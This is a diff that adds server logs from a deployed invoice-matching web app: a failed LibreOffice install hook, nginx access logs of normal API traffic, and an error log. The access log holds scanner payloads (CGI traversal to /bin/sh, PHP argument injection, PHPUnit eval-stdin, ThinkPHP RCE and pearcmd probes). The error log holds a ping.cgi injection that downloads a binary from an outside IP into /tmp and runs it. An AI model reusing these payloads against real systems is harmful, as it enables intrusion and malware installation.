@@ -1,0 +1,438 @@
+----------------------------------------
+/var/log/eb-hooks.log
+----------------------------------------
+2026/04/23 07:00:33.762367 [INFO] Running command: .platform/hooks/prebuild/01_libreoffice.sh
+2026/04/23 07:00:35.634564 [INFO] [prebuild] Checking LibreOffice...
+[prebuild] Installing LibreOffice...
+Amazon Linux 2023 repository                     48 kB/s | 3.6 kB     00:00    
+Amazon Linux 2023 Kernel Livepatch repository    39 kB/s | 2.9 kB     00:00    
+No match for argument: libreoffice-core
+No match for argument: libreoffice-calc
+No match for argument: libreoffice-pyuno
+Last metadata expiration check: 0:00:01 ago on Thu Apr 23 07:00:34 2026.
+No match for argument: libreoffice
+
+2026/04/23 07:00:35.634626 [INFO] Error: Unable to find a match: libreoffice
+
+
+
+----------------------------------------
+/var/log/nginx/access.log
+----------------------------------------
+166.88.169.176 - - [23/Apr/2026:06:28:41 +0000] "POST / HTTP/1.1" 405 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
+204.76.203.206 - - [23/Apr/2026:06:34:45 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:41:44 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:41:44 +0000] "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 200 5553 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:41:44 +0000] "GET /static/js/main.2144f5b6.js HTTP/1.1" 200 307602 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:41:44 +0000] "GET /manifest.json HTTP/1.1" 200 492 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:42:02 +0000] "POST /api/invoice-batch/preview HTTP/1.1" 200 13964 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:42:41 +0000] "POST /api/invoice/generate HTTP/1.1" 200 104166 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:43:05 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:43:05 +0000] "GET /api/sales/data HTTP/1.1" 200 16200 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:43:06 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:43:06 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+204.76.203.206 - - [23/Apr/2026:06:44:35 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:47:01 +0000] "GET /api/sales/data HTTP/1.1" 200 16200 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:47:22 +0000] "POST /api/invoice-batch/preview HTTP/1.1" 200 13964 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:47:27 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:47:30 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+27.0.238.70 - - [23/Apr/2026:06:48:38 +0000] "GET / HTTP/1.1" 200 902 "-" "facebookexternalhit/1.1; kakaotalk-scrap/1.0; +https://devtalk.kakao.com/t/scrap/33984" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:26 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:26 +0000] "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 200 5553 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:26 +0000] "GET /static/js/main.2144f5b6.js HTTP/1.1" 200 307602 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:26 +0000] "GET /manifest.json HTTP/1.1" 200 492 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:27 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:39 +0000] "GET /api/ublox/data HTTP/1.1" 200 1085108 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:45 +0000] "GET /api/sales/data HTTP/1.1" 200 16200 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:50:51 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+59.9.178.113 - - [23/Apr/2026:06:51:24 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:51:56 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:51:56 +0000] "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 200 5553 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:51:56 +0000] "GET /static/js/main.2144f5b6.js HTTP/1.1" 200 307602 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:51:56 +0000] "GET /manifest.json HTTP/1.1" 200 492 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:52:13 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:53:00 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:53:00 +0000] "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 304 0 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:53:00 +0000] "GET /static/js/main.2144f5b6.js HTTP/1.1" 304 0 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:53:00 +0000] "GET /manifest.json HTTP/1.1" 200 492 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:53:17 +0000] "POST /api/invoice-batch/preview HTTP/1.1" 200 13964 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+204.76.203.206 - - [23/Apr/2026:06:53:38 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:53:54 +0000] "GET /api/sales/data HTTP/1.1" 200 16200 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:56:33 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:56:33 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:56:37 +0000] "GET /api/sales/data HTTP/1.1" 200 16200 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:56:38 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:57:03 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:57:11 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:57:11 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:58:07 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:58:09 +0000] "GET /api/exchange-rate HTTP/1.1" 200 44 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:58:20 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+93.174.93.12 - - [23/Apr/2026:06:58:41 +0000] "GET / HTTP/1.0" 400 30 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" "-"
+222.107.157.9 - - [23/Apr/2026:06:59:44 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:59:45 +0000] "GET /api/ublox/data HTTP/1.1" 200 1085108 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+222.107.157.9 - - [23/Apr/2026:06:59:49 +0000] "GET /api/auo/data HTTP/1.1" 200 2258325 "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-"
+204.76.203.206 - - [23/Apr/2026:07:00:31 +0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:10 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:12 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:26 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 405 31 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:27 +0000] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 405 31 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:27 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:27 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:27 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:31 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:31 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:31 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:32 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:32 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:32 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:36 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+115.191.32.57 - - [23/Apr/2026:07:01:36 +0000] "GET /containers/json HTTP/1.1" 200 902 "-" "libredtail-http" "-"
+
+
+----------------------------------------
+/var/log/nginx/error.log
+----------------------------------------
+2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "year" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
+2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "month" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
